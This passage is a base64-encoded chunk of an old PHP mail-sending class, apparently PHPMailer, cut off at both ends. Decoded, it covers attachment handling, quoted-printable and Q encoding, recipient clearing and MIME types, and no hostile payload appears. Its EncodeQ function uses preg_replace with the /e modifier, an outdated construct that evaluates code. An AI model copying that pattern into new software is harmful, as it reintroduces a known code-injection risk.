zIGEgNDozIHJhdGlvCiAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCA9IGZsb29yKCRsZW5ndGggKiAkcmF0aW8gKiAuNzUpOwoKICAgIGZvciAoJGkgPSAwOyAkaSA8ICRtYl9sZW5ndGg7ICRpICs9ICRvZmZzZXQpIHsKICAgICAgJGxvb2tCYWNrID0gMDsKCiAgICAgIGRvIHsKICAgICAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCAtICRsb29rQmFjazsKICAgICAgICAkY2h1bmsgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAkY2h1bmsgPSBiYXNlNjRfZW5jb2RlKCRjaHVuayk7CiAgICAgICAgJGxvb2tCYWNrKys7CiAgICAgIH0KICAgICAgd2hpbGUgKHN0cmxlbigkY2h1bmspID4gJGxlbmd0aCk7CgogICAgICAkZW5jb2RlZCAuPSAkY2h1bmsgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLy8gQ2hvbXAgdGhlIGxhc3QgbGluZWZlZWQKICAgICRlbmNvZGVkID0gc3Vic3RyKCRlbmNvZGVkLCAwLCAtc3RybGVuKCR0aGlzLT5MRSkpOwogICAgcmV0dXJuICRlbmNvZGVkOwogIH0KCiAgLyoqCiAgICogRW5jb2RlIHN0cmluZyB0byBxdW90ZWQtcHJpbnRhYmxlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gRW5jb2RlUVAoICRpbnB1dCA9ICcnLCAkbGluZV9tYXggPSA3NiwgJHNwYWNlX2NvbnYgPSBmYWxzZSApIHsKICAgICRoZXggPSBhcnJheSgnMCcsJzEnLCcyJywnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJ0EnLCdCJywnQycsJ0QnLCdFJywnRicpOwogICAgJGxpbmVzID0gcHJlZ19zcGxpdCgnLyg/OlxyXG58XHJ8XG4pLycsICRpbnB1dCk7CiAgICAkZW9sID0gIlxyXG4iOwogICAgJGVzY2FwZSA9ICc9JzsKICAgICRvdXRwdXQgPSAnJzsKICAgIHdoaWxlKCBsaXN0KCwgJGxpbmUpID0gZWFjaCgkbGluZXMpICkgewogICAgICAkbGlubGVuID0gc3RybGVuKCRsaW5lKTsKICAgICAgJG5ld2xpbmUgPSAnJzsKICAgICAgZm9yKCRpID0gMDsgJGkgPCAkbGlubGVuOyAkaSsrKSB7CiAgICAgICAgJGMgPSBzdWJzdHIoICRsaW5lLCAkaSwgMSApOwogICAgICAgICRkZWMgPSBvcmQoICRjICk7CiAgICAgICAgaWYgKCAoICRpID09IDAgKSAmJiAoICRkZWMgPT0gNDYgKSApIHsgLy8gY29udmVydCBmaXJzdCBwb2ludCBpbiB0aGUgbGluZSBpbnRvID0yRQogICAgICAgICAgJGMgPSAnPTJFJzsKICAgICAgICB9CiAgICAgICAgaWYgKCAkZGVjID09IDMyICkgewogICAgICAgICAgaWYgKCAkaSA9PSAoICRsaW5sZW4gLSAxICkgKSB7IC8vIGNvbnZlcnQgc3BhY2UgYXQgZW9sIG9ubHkKICAgICAgICAgICAgJGMgPSAnPTIwJzsKICAgICAgICAgIH0gZWxzZSBpZiAoICRzcGFjZV9jb252ICkgewogICAgICAgICAgICAkYyA9ICc9MjAnOwogICAgICAgICAgfQogICAgICAgIH0gZWxzZWlmICggKCRkZWMgPT0gNjEpIHx8ICgkZGVjIDwgMzIgKSB8fCAoJGRlYyA+IDEyNikgKSB7IC8vIGFsd2F5cyBlbmNvZGUgIlx0Iiwgd2hpY2ggaXMgKm5vdCogcmVxdWlyZWQKICAgICAgICAgICRoMiA9IGZsb29yKCRkZWMvMTYpOwogICAgICAgICAgJGgxID0gZmxvb3IoJGRlYyUxNik7CiAgICAgICAgICAkYyA9ICRlc2NhcGUuJGhleFskaDJdLiRoZXhbJGgxXTsKICAgICAgICB9CiAgICAgICAgaWYgKCAoc3RybGVuKCRuZXdsaW5lKSArIHN0cmxlbigkYykpID49ICRsaW5lX21heCApIHsgLy8gQ1JMRiBpcyBub3QgY291bnRlZAogICAgICAgICAgJG91dHB1dCAuPSAkbmV3bGluZS4kZXNjYXBlLiRlb2w7IC8vICBzb2Z0IGxpbmUgYnJlYWs7ICIgPVxyXG4iIGlzIG9rYXkKICAgICAgICAgICRuZXdsaW5lID0gJyc7CiAgICAgICAgICAvLyBjaGVjayBpZiBuZXdsaW5lIGZpcnN0IGNoYXJhY3RlciB3aWxsIGJlIHBvaW50IG9yIG5vdAogICAgICAgICAgaWYgKCAkZGVjID09IDQ2ICkgewogICAgICAgICAgICAkYyA9ICc9MkUnOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkbmV3bGluZSAuPSAkYzsKICAgICAgfSAvLyBlbmQgb2YgZm9yCiAgICAgICRvdXRwdXQgLj0gJG5ld2xpbmUuJGVvbDsKICAgIH0gLy8gZW5kIG9mIHdoaWxlCiAgICByZXR1cm4gdHJpbSgkb3V0cHV0KTsKICB9CgogIC8qKgogICAqIEVuY29kZSBzdHJpbmcgdG8gcSBlbmNvZGluZy4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIEVuY29kZVEgKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykgewogICAgLyogVGhlcmUgc2hvdWxkIG5vdCBiZSBhbnkgRU9MIGluIHRoZSBzdHJpbmcgKi8KICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCJbXHJcbl0iLCAnJywgJHN0cik7CgogICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsKICAgICAgY2FzZSAncGhyYXNlJzoKICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgiLyhbXkEtWmEtejAtOSEqK1wvIC1dKS9lIiwgIic9Jy5zcHJpbnRmKCclMDJYJywgb3JkKCdcXDEnKSkiLCAkZW5jb2RlZCk7CiAgICAgICAgYnJlYWs7CiAgICAgIGNhc2UgJ2NvbW1lbnQnOgogICAgICAgICRlbmNvZGVkID0gcHJlZ19yZXBsYWNlKCIvKFtcKFwpXCJdKS9lIiwgIic9Jy5zcHJpbnRmKCclMDJYJywgb3JkKCdcXDEnKSkiLCAkZW5jb2RlZCk7CiAgICAgIGNhc2UgJ3RleHQnOgogICAgICBkZWZhdWx0OgogICAgICAgIC8qIFJlcGxhY2UgZXZlcnkgaGlnaCBhc2NpaSwgY29udHJvbCA9LCA/IGFuZCBfIGNoYXJhY3RlcnMgKi8KICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnLyhbXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdcMTc3LVwzNzddKS9lJywKICAgICAgICAgICAgICAiJz0nLnNwcmludGYoJyUwMlgnLCBvcmQoJ1xcMScpKSIsICRlbmNvZGVkKTsKICAgICAgICBicmVhazsKICAgIH0KCiAgICAvKiBSZXBsYWNlIGV2ZXJ5IHNwYWNlcyB0byBfIChtb3JlIHJlYWRhYmxlIHRoYW4gPTIwKSAqLwogICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgnICcsICdfJywgJGVuY29kZWQpOwoKICAgIHJldHVybiAkZW5jb2RlZDsKICB9CgogIC8qKgogICAqIEFkZHMgYSBzdHJpbmcgb3IgYmluYXJ5IGF0dGFjaG1lbnQgKG5vbi1maWxlc3lzdGVtKSB0byB0aGUgbGlzdC4KICAgKiBUaGlzIG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsCiAgICogc3VjaCBhcyBhIEJMT0IgcmVjb3JkIGZyb20gYSBkYXRhYmFzZS4KICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgU3RyaW5nIGF0dGFjaG1lbnQgZGF0YS4KICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZSBOYW1lIG9mIHRoZSBhdHRhY2htZW50LgogICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgRmlsZSBleHRlbnNpb24gKE1JTUUpIHR5cGUuCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gQWRkU3RyaW5nQXR0YWNobWVudCgkc3RyaW5nLCAkZmlsZW5hbWUsICRlbmNvZGluZyA9ICdiYXNlNjQnLCAkdHlwZSA9ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nKSB7CiAgICAvKiBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkgKi8KICAgICRjdXIgPSBjb3VudCgkdGhpcy0+YXR0YWNobWVudCk7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVswXSA9ICRzdHJpbmc7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVsxXSA9ICRmaWxlbmFtZTsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzJdID0gJGZpbGVuYW1lOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bM10gPSAkZW5jb2Rpbmc7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVs0XSA9ICR0eXBlOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bNV0gPSB0cnVlOyAvLyBpc1N0cmluZwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bNl0gPSAnYXR0YWNobWVudCc7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVs3XSA9IDA7CiAgfQoKICAvKioKICAgKiBBZGRzIGFuIGVtYmVkZGVkIGF0dGFjaG1lbnQuICBUaGlzIGNhbiBpbmNsdWRlIGltYWdlcywgc291bmRzLCBhbmQKICAgKiBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudC4gIE1ha2Ugc3VyZSB0byBzZXQgdGhlICR0eXBlIHRvIGFuCiAgICogaW1hZ2UgdHlwZS4gIEZvciBKUEVHIGltYWdlcyB1c2UgImltYWdlL2pwZWciIGFuZCBmb3IgR0lGIGltYWdlcwogICAqIHVzZSAiaW1hZ2UvZ2lmIi4KICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQuCiAgICogQHBhcmFtIHN0cmluZyAkY2lkIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQuICBVc2UgdGhpcyB0byBpZGVudGlmeQogICAqICAgICAgICB0aGUgSWQgZm9yIGFjY2Vzc2luZyB0aGUgaW1hZ2UgaW4gYW4gSFRNTCBmb3JtLgogICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUuCiAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuCiAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBBZGRFbWJlZGRlZEltYWdlKCRwYXRoLCAkY2lkLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJykgewoKICAgIGlmKCFAaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgJHRoaXMtPlNldEVycm9yKCR0aGlzLT5MYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOwogICAgaWYoJG5hbWUgPT0gJycpIHsKICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7CiAgICB9CgogICAgLyogQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5ICovCiAgICAkY3VyID0gY291bnQoJHRoaXMtPmF0dGFjaG1lbnQpOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bMF0gPSAkcGF0aDsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzFdID0gJGZpbGVuYW1lOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bMl0gPSAkbmFtZTsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzNdID0gJGVuY29kaW5nOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bNF0gPSAkdHlwZTsKICAgICR0aGlzLT5hdHRhY2htZW50WyRjdXJdWzVdID0gZmFsc2U7CiAgICAkdGhpcy0+YXR0YWNobWVudFskY3VyXVs2XSA9ICdpbmxpbmUnOwogICAgJHRoaXMtPmF0dGFjaG1lbnRbJGN1cl1bN10gPSAkY2lkOwoKICAgIHJldHVybiB0cnVlOwogIH0KCiAgLyoqCiAgICogUmV0dXJucyB0cnVlIGlmIGFuIGlubGluZSBhdHRhY2htZW50IGlzIHByZXNlbnQuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBib29sCiAgICovCiAgZnVuY3Rpb24gSW5saW5lSW1hZ2VFeGlzdHMoKSB7CiAgICAkcmVzdWx0ID0gZmFsc2U7CiAgICBmb3IoJGkgPSAwOyAkaSA8IGNvdW50KCR0aGlzLT5hdHRhY2htZW50KTsgJGkrKykgewogICAgICBpZigkdGhpcy0+YXR0YWNobWVudFskaV1bNl0gPT0gJ2lubGluZScpIHsKICAgICAgICAkcmVzdWx0ID0gdHJ1ZTsKICAgICAgICBicmVhazsKICAgICAgfQogICAgfQoKICAgIHJldHVybiAkcmVzdWx0OwogIH0KCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwogIC8vIENMQVNTIE1FVEhPRFMsIE1FU1NBR0UgUkVTRVQKICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgogIC8qKgogICAqIENsZWFycyBhbGwgcmVjaXBpZW50cyBhc3NpZ25lZCBpbiB0aGUgVE8gYXJyYXkuICBSZXR1cm5zIHZvaWQuCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gQ2xlYXJBZGRyZXNzZXMoKSB7CiAgICAkdGhpcy0+dG8gPSBhcnJheSgpOwogIH0KCiAgLyoqCiAgICogQ2xlYXJzIGFsbCByZWNpcGllbnRzIGFzc2lnbmVkIGluIHRoZSBDQyBhcnJheS4gIFJldHVybnMgdm9pZC4KICAgKiBAcmV0dXJuIHZvaWQKICAgKi8KICBmdW5jdGlvbiBDbGVhckNDcygpIHsKICAgICR0aGlzLT5jYyA9IGFycmF5KCk7CiAgfQoKICAvKioKICAgKiBDbGVhcnMgYWxsIHJlY2lwaWVudHMgYXNzaWduZWQgaW4gdGhlIEJDQyBhcnJheS4gIFJldHVybnMgdm9pZC4KICAgKiBAcmV0dXJuIHZvaWQKICAgKi8KICBmdW5jdGlvbiBDbGVhckJDQ3MoKSB7CiAgICAkdGhpcy0+YmNjID0gYXJyYXkoKTsKICB9CgogIC8qKgogICAqIENsZWFycyBhbGwgcmVjaXBpZW50cyBhc3NpZ25lZCBpbiB0aGUgUmVwbHlUbyBhcnJheS4gIFJldHVybnMgdm9pZC4KICAgKiBAcmV0dXJuIHZvaWQKICAgKi8KICBmdW5jdGlvbiBDbGVhclJlcGx5VG9zKCkgewogICAgJHRoaXMtPlJlcGx5VG8gPSBhcnJheSgpOwogIH0KCiAgLyoqCiAgICogQ2xlYXJzIGFsbCByZWNpcGllbnRzIGFzc2lnbmVkIGluIHRoZSBUTywgQ0MgYW5kIEJDQwogICAqIGFycmF5LiAgUmV0dXJucyB2b2lkLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIENsZWFyQWxsUmVjaXBpZW50cygpIHsKICAgICR0aGlzLT50byA9IGFycmF5KCk7CiAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOwogICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7CiAgfQoKICAvKioKICAgKiBDbGVhcnMgYWxsIHByZXZpb3VzbHkgc2V0IGZpbGVzeXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeQogICAqIGF0dGFjaG1lbnRzLiAgUmV0dXJucyB2b2lkLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIENsZWFyQXR0YWNobWVudHMoKSB7CiAgICAkdGhpcy0+YXR0YWNobWVudCA9IGFycmF5KCk7CiAgfQoKICAvKioKICAgKiBDbGVhcnMgYWxsIGN1c3RvbSBoZWFkZXJzLiAgUmV0dXJucyB2b2lkLgogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIENsZWFyQ3VzdG9tSGVhZGVycygpIHsKICAgICR0aGlzLT5DdXN0b21IZWFkZXIgPSBhcnJheSgpOwogIH0KCiAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwogIC8vIENMQVNTIE1FVEhPRFMsIE1JU0NFTExBTkVPVVMKICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgogIC8qKgogICAqIEFkZHMgdGhlIGVycm9yIG1lc3NhZ2UgdG8gdGhlIGVycm9yIGNvbnRhaW5lci4KICAgKiBSZXR1cm5zIHZvaWQuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gU2V0RXJyb3IoJG1zZykgewogICAgJHRoaXMtPmVycm9yX2NvdW50Kys7CiAgICAkdGhpcy0+RXJyb3JJbmZvID0gJG1zZzsKICB9CgogIC8qKgogICAqIFJldHVybnMgdGhlIHByb3BlciBSRkMgODIyIGZvcm1hdHRlZCBkYXRlLgogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgZnVuY3Rpb24gUkZDRGF0ZSgpIHsKICAgICR0eiA9IGRhdGUoJ1onKTsKICAgICR0enMgPSAoJHR6IDwgMCkgPyAnLScgOiAnKyc7CiAgICAkdHogPSBhYnMoJHR6KTsKICAgICR0eiA9IChpbnQpKCR0ei8zNjAwKSoxMDAgKyAoJHR6JTM2MDApLzYwOwogICAgJHJlc3VsdCA9IHNwcmludGYoIiVzICVzJTA0ZCIsIGRhdGUoJ0QsIGogTSBZIEg6aTpzJyksICR0enMsICR0eik7CgogICAgcmV0dXJuICRyZXN1bHQ7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIHRoZSBhcHByb3ByaWF0ZSBzZXJ2ZXIgdmFyaWFibGUuICBTaG91bGQgd29yayB3aXRoIGJvdGgKICAgKiBQSFAgNC4xLjArIGFzIHdlbGwgYXMgb2xkZXIgdmVyc2lvbnMuICBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZwogICAqIGlmIG5vdGhpbmcgaXMgZm91bmQuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBtaXhlZAogICAqLwogIGZ1bmN0aW9uIFNlcnZlclZhcigkdmFyTmFtZSkgewogICAgZ2xvYmFsICRIVFRQX1NFUlZFUl9WQVJTOwogICAgZ2xvYmFsICRIVFRQX0VOVl9WQVJTOwoKICAgIGlmKCFpc3NldCgkX1NFUlZFUikpIHsKICAgICAgJF9TRVJWRVIgPSAkSFRUUF9TRVJWRVJfVkFSUzsKICAgICAgaWYoIWlzc2V0KCRfU0VSVkVSWydSRU1PVEVfQUREUiddKSkgewogICAgICAgICRfU0VSVkVSID0gJEhUVFBfRU5WX1ZBUlM7IC8vIG11c3QgYmUgQXBhY2hlCiAgICAgIH0KICAgIH0KCiAgICBpZihpc3NldCgkX1NFUlZFUlskdmFyTmFtZV0pKSB7CiAgICAgIHJldHVybiAkX1NFUlZFUlskdmFyTmFtZV07CiAgICB9IGVsc2UgewogICAgICByZXR1cm4gJyc7CiAgICB9CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIHRoZSBzZXJ2ZXIgaG9zdG5hbWUgb3IgJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicgaWYgdW5rbm93bi4KICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKiBAcmV0dXJuIHN0cmluZwogICAqLwogIGZ1bmN0aW9uIFNlcnZlckhvc3RuYW1lKCkgewogICAgaWYgKCR0aGlzLT5Ib3N0bmFtZSAhPSAnJykgewogICAgICAkcmVzdWx0ID0gJHRoaXMtPkhvc3RuYW1lOwogICAgfSBlbHNlaWYgKCR0aGlzLT5TZXJ2ZXJWYXIoJ1NFUlZFUl9OQU1FJykgIT0gJycpIHsKICAgICAgJHJlc3VsdCA9ICR0aGlzLT5TZXJ2ZXJWYXIoJ1NFUlZFUl9OQU1FJyk7CiAgICB9IGVsc2UgewogICAgICAkcmVzdWx0ID0gJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbic7CiAgICB9CgogICAgcmV0dXJuICRyZXN1bHQ7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIGEgbWVzc2FnZSBpbiB0aGUgYXBwcm9wcmlhdGUgbGFuZ3VhZ2UuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBMYW5nKCRrZXkpIHsKICAgIGlmKGNvdW50KCR0aGlzLT5sYW5ndWFnZSkgPCAxKSB7CiAgICAgICR0aGlzLT5TZXRMYW5ndWFnZSgnZW4nKTsgLy8gc2V0IHRoZSBkZWZhdWx0IGxhbmd1YWdlCiAgICB9CgogICAgaWYoaXNzZXQoJHRoaXMtPmxhbmd1YWdlWyRrZXldKSkgewogICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldOwogICAgfSBlbHNlIHsKICAgICAgcmV0dXJuICdMYW5ndWFnZSBzdHJpbmcgZmFpbGVkIHRvIGxvYWQ6ICcgLiAka2V5OwogICAgfQogIH0KCiAgLyoqCiAgICogUmV0dXJucyB0cnVlIGlmIGFuIGVycm9yIG9jY3VycmVkLgogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIElzRXJyb3IoKSB7CiAgICByZXR1cm4gKCR0aGlzLT5lcnJvcl9jb3VudCA+IDApOwogIH0KCiAgLyoqCiAgICogQ2hhbmdlcyBldmVyeSBlbmQgb2YgbGluZSBmcm9tIENSIG9yIExGIHRvIENSTEYuCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBmdW5jdGlvbiBGaXhFT0woJHN0cikgewogICAgJHN0ciA9IHN0cl9yZXBsYWNlKCJcclxuIiwgIlxuIiwgJHN0cik7CiAgICAkc3RyID0gc3RyX3JlcGxhY2UoIlxyIiwgIlxuIiwgJHN0cik7CiAgICAkc3RyID0gc3RyX3JlcGxhY2UoIlxuIiwgJHRoaXMtPkxFLCAkc3RyKTsKICAgIHJldHVybiAkc3RyOwogIH0KCiAgLyoqCiAgICogQWRkcyBhIGN1c3RvbSBoZWFkZXIuCiAgICogQHJldHVybiB2b2lkCiAgICovCiAgZnVuY3Rpb24gQWRkQ3VzdG9tSGVhZGVyKCRjdXN0b21faGVhZGVyKSB7CiAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBleHBsb2RlKCc6JywgJGN1c3RvbV9oZWFkZXIsIDIpOwogIH0KCiAgLyoqCiAgICogRXZhbHVhdGVzIHRoZSBtZXNzYWdlIGFuZCByZXR1cm5zIG1vZGlmaWNhdGlvbnMgZm9yIGlubGluZSBpbWFnZXMgYW5kIGJhY2tncm91bmRzCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuICRtZXNzYWdlCiAgICovCiAgZnVuY3Rpb24gTXNnSFRNTCgkbWVzc2FnZSwkYmFzZWRpcj0nJykgewogICAgcHJlZ19tYXRjaF9hbGwoIi8oc3JjfGJhY2tncm91bmQpPVwiKC4qKVwiL1VpIiwgJG1lc3NhZ2UsICRpbWFnZXMpOwogICAgaWYoaXNzZXQoJGltYWdlc1syXSkpIHsKICAgICAgZm9yZWFjaCgkaW1hZ2VzWzJdIGFzICRpID0+ICR1cmwpIHsKICAgICAgICAvLyBkbyBub3QgY2hhbmdlIHVybHMgZm9yIGFic29sdXRlIGltYWdlcyAodGhhbmtzIHRvIGNvcnZ1c2NvcmF4KQogICAgICAgIGlmICghcHJlZ19tYXRjaCgnL15bQS16XVtBLXpdKjpcL1wvLycsJHVybCkpIHsKICAgICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCR1cmwpOwogICAgICAgICAgJGRpcmVjdG9yeSA9IGRpcm5hbWUoJHVybCk7CiAgICAgICAgICAoJGRpcmVjdG9yeSA9PSAnLicpPyRkaXJlY3Rvcnk9Jyc6Jyc7CiAgICAgICAgICAkY2lkID0gJ2NpZDonIC4gbWQ1KCRmaWxlbmFtZSk7CiAgICAgICAgICAkZmlsZVBhcnRzID0gc3BsaXQoIlwuIiwgJGZpbGVuYW1lKTsKICAgICAgICAgICRleHQgPSAkZmlsZVBhcnRzWzFdOwogICAgICAgICAgJG1pbWVUeXBlID0gJHRoaXMtPl9taW1lX3R5cGVzKCRleHQpOwogICAgICAgICAgaWYgKCBzdHJsZW4oJGJhc2VkaXIpID4gMSAmJiBzdWJzdHIoJGJhc2VkaXIsLTEpICE9ICcvJykgeyAkYmFzZWRpciAuPSAnLyc7IH0KICAgICAgICAgIGlmICggc3RybGVuKCRkaXJlY3RvcnkpID4gMSAmJiBzdWJzdHIoJGJhc2VkaXIsLTEpICE9ICcvJykgeyAkZGlyZWN0b3J5IC49ICcvJzsgfQogICAgICAgICAgJHRoaXMtPkFkZEVtYmVkZGVkSW1hZ2UoJGJhc2VkaXIuJGRpcmVjdG9yeS4kZmlsZW5hbWUsIG1kNSgkZmlsZW5hbWUpLCAkZmlsZW5hbWUsICdiYXNlNjQnLCAkbWltZVR5cGUpOwogICAgICAgICAgaWYgKCAkdGhpcy0+QWRkRW1iZWRkZWRJbWFnZSgkYmFzZWRpci4kZGlyZWN0b3J5LiRmaWxlbmFtZSwgbWQ1KCRmaWxlbmFtZSksICRmaWxlbmFtZSwgJ2Jhc2U2NCcsJG1pbWVUeXBlKSApIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSBwcmVnX3JlcGxhY2UoIi8iLiRpbWFnZXNbMV1bJGldLiI9XCIiLnByZWdfcXVvdGUoJHVybCwgJy8nKS4iXCIvVWkiLCAkaW1hZ2VzWzFdWyRpXS4iPVwiIi4kY2lkLiJcIiIsICRtZXNzYWdlKTsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgICR0aGlzLT5Jc0hUTUwodHJ1ZSk7CiAgICAkdGhpcy0+Qm9keSA9ICRtZXNzYWdlOwogICAgJHRleHRNc2cgPSB0cmltKHN0cmlwX3RhZ3MocHJlZ19yZXBsYWNlKCcvPChoZWFkfHRpdGxlfHN0eWxlfHNjcmlwdClbXj5dKj4uKj88XC9cXDE+L3MnLCcnLCRtZXNzYWdlKSkpOwogICAgaWYgKCAhZW1wdHkoJHRleHRNc2cpICYmIGVtcHR5KCR0aGlzLT5BbHRCb2R5KSApIHsKICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGV4dE1zZzsKICAgIH0KICAgIGlmICggZW1wdHkoJHRoaXMtPkFsdEJvZHkpICkgewogICAgICAkdGhpcy0+QWx0Qm9keSA9ICdUbyB2aWV3IHRoaXMgZW1haWwgbWVzc2FnZSwgb3BlbiB0aGUgZW1haWwgaW4gd2l0aCBIVE1MIGNvbXBhdGliaWxpdHkhJyAuICJcblxuIjsKICAgIH0KICB9CgogIC8qKgogICAqIEdldHMgdGhlIG1pbWUgdHlwZSBvZiB0aGUgZW1iZWRkZWQgb3IgaW5saW5lIGltYWdlCiAgICogQGFjY2VzcyBwcml2YXRlCiAgICogQHJldHVybiBtaW1lIHR5cGUgb2YgZXh0CiAgICovCiAgZnVuY3Rpb24gX21pbWVfdHlwZXMoJGV4dCA9ICcnKSB7CiAgICAkbWltZXMgPSBhcnJheSgKICAgICAgJ2hxeCcgID0+ICAnYXBwbGljYXRpb24vbWFjLWJpbmhleDQwJywKICAgICAgJ2NwdCcgICA9PiAgJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywKICAgICAgJ2RvYycgICA9PiAgJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICdiaW4nICAgPT4gICdhcHBsaWNhdGlvbi9tYWNiaW5hcnknLAogICAgICAnZG1zJyAgID0+ICAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgJ2xoYScgICA9PiAgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICdsemgnICAgPT4gICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAnZXhlJyAgID0+ICAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgJ2NsYXNzJyA9PiAgJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICdwc2QnICAgPT4gICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAnc28nICAgID0+ICA